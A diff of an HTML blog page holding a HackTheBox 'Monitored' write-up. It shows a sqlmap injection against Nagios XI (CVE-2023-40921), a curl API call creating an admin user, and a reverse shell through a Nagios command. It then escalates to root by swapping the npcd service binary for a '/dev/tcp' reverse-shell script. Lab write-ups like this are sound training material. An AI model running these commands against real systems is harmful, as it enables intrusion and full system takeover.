@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Monitored-Linux-Medium</h1>
   
@@ -76,95 +68,103 @@
 <h2 id="1-enumeration">1: Enumeration</h2>
 
 <ul>
-  <li>nmap scanning</li>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_1.png" alt="Untitled" />
+<br /><br />
+After some re-search we find some vulnerabilities with a possible slq injection but we need some creds with low privileges
+<br /><br />
+<img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_2.png" alt="Untitled" />
+<br /><br />
+    <h2 id="2-user-flag">2: User flag</h2>
+    <p><br /><br /></p>
+    <blockquote>
+      <p>If we perform a snmpwalk to get a full list about allow gadgets in the network</p>
+
+      <p><br /><br />
+There we find some creds, they are no useful for the main page but we can try with sqlmap</p>
+    </blockquote>
+  </li>
 </ul>
-
-<p><img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_1.png" alt="Untitled" /></p>
-
-<p>After some re-search we find some vulnerabilities with a possible slq injection but we need some creds with low privileges</p>
-
-<p><img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_2.png" alt="Untitled" /></p>
-
-<h2 id="2-user-flag">2: User flag</h2>
-
-<blockquote>
-  <p>If we perform a snmpwalk to get a full list about allow gadgets in the network</p>
-
-</blockquote>
-
-<p>There we find some creds, they are no useful for the main page but we can try with sqlmap</p>
 
 <blockquote>
   <p>Looking fo vulnerabilities we find a specific url which doesn’t has sanitization in a parameter (id) (CVE-2023-40921)</p>
 
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> &lt;url&gt; <span class="nt">--data</span> <span class="s2">"user&amp;password"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--batch</span><span class="o">(</span>automatic<span class="o">)</span> <span class="nt">-D</span><span class="o">(</span>db<span class="o">)</span>
+  <p><br /><br /></p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> &lt;url&gt; <span class="nt">--data</span> <span class="s2">"user&amp;password"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--batch</span><span class="o">(</span>automatic<span class="o">)</span> <span class="nt">-D</span><span class="o">(</span>db<span class="o">)</span>
 nagxi <span class="nt">-T</span><span class="o">(</span>table<span class="o">)</span> <span class="nt">--dump</span><span class="o">(</span>get data<span class="o">)</span>
-</code></pre></div></div>
+</code></pre></div>  </div>
+  <p><br /><br />
+<img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_3.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_4.png" alt="Untitled" />
+<br /><br />
+Now we have an auth token and we are able to create a new user for nagios</p>
 
-<p><img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_3.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1/d0bfa8f8-013a-4578-ab49-3bbaf70e1252-export-49959e46-a755-4fcf-8998-f9537419a5b1_Untitled_4.png" alt="Untitled" /></p>
-
-<blockquote>
-  <p>Now we have an auth token and we are able to create a new user for nagios</p>
-
-</blockquote>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="s2">"https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1"</span> <span class="nt">-d</span> <span class="s2">"username=admin111&amp;password=admin111&amp;name=Admin111&amp;email=admin111@localhost&amp;auth_level=admin"</span>
-</code></pre></div></div>
-
-<p>We get into nagios dashboard in the route</p>
-
-<ol>
-  <li>Core config</li>
-  <li>Commands and create a new command(rev shell)</li>
-  <li>apply conf</li>
-  <li>Monitoring→host→local→checkcommand</li>
-  <li>Listen on specific port and user flag got it</li>
-</ol>
-
-<h2 id="3-priv-esc">3: Priv esc</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>linpeas.sh]<span class="o">(</span>http://linpeas.sh/<span class="o">)</span>:
+  <p><br /><br /></p>
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> <span class="s2">"https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1"</span> <span class="nt">-d</span> <span class="s2">"username=admin111&amp;password=admin111&amp;name=Admin111&amp;email=admin111@localhost&amp;auth_level=admin"</span>
+</code></pre></div>  </div>
+  <p><br /><br />
+We get into nagios dashboard in the route 
+<br /><br /></p>
+  <ol>
+    <li>Core config
+<br /><br /></li>
+    <li>Commands and create a new command(rev shell)
+<br /><br /></li>
+    <li>apply conf
+<br /><br /></li>
+    <li>Monitoring→host→local→checkcommand
+<br /><br /></li>
+    <li>Listen on specific port and user flag got it
+<br /><br />
+      <h2 id="3-priv-esc">3: Priv esc</h2>
+      <p><br /><br /></p>
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>linpeas.sh]<span class="o">(</span>http://linpeas.sh/<span class="o">)</span>:
 /etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path
 /etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
 /etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
 /etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios
 /etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
 /etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
-</code></pre></div></div>
-
-<p>We can modify /usr/local/nagios/bin/npcd file.</p>
-
-<p>Check out what we can run as root:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>:
+</code></pre></div>      </div>
+      <p><br /><br />
+We can modify /usr/local/nagios/bin/npcd file.
+<br /><br />
+Check out what we can run as root:
+<br /><br /></p>
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>:
 ....
 /usr/local/nagiosxi/scripts/manage_services.sh <span class="k">*</span>
-</code></pre></div></div>
+</code></pre></div>      </div>
+      <p><br /><br />
+We can start/stop npcd.service.
+<br /><br />
+```bash
+$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
+$ rm npcd</p>
+    </li>
+  </ol>
+</blockquote>
 
-<p>We can start/stop npcd.service.</p>
+<h2 id="pass-a-new-npcd-file-with-the-rev-shell-lines-dont-try-to-modify-a-bin">pass a new npcd file with the rev shell lines (Dont try to modify a bin</h2>
+<p>##in those conditions is almost imposible)</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
-<span class="nv">$ </span><span class="nb">rm </span>npcd
+<p>#!/bin/bash</p>
 
-<span class="c">## pass a new npcd file with the rev shell lines (Dont try to modify a bin</span>
-<span class="c">##in those conditions is almost imposible)</span>
+<h2 id="bash--i--devtcpyour-ipyour-port-01">bash -i &gt;&amp; /dev/tcp/YOUR-IP/YOUR-PORT 0&gt;&amp;1</h2>
 
-<span class="c">#!/bin/bash</span>
-
-<span class="c">## bash -i &gt;&amp; /dev/tcp/YOUR-IP/YOUR-PORT 0&gt;&amp;1</span>
-
-<span class="c">##Start nc on your local machine, then:</span>
-<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/nagiosxi/scripts/manage_services.sh start npcd
-</code></pre></div></div>
-
-<p>machine pwned!!!!
+<p>##Start nc on your local machine, then:
+$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
+```
+<br /><br />
+machine pwned!!!!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
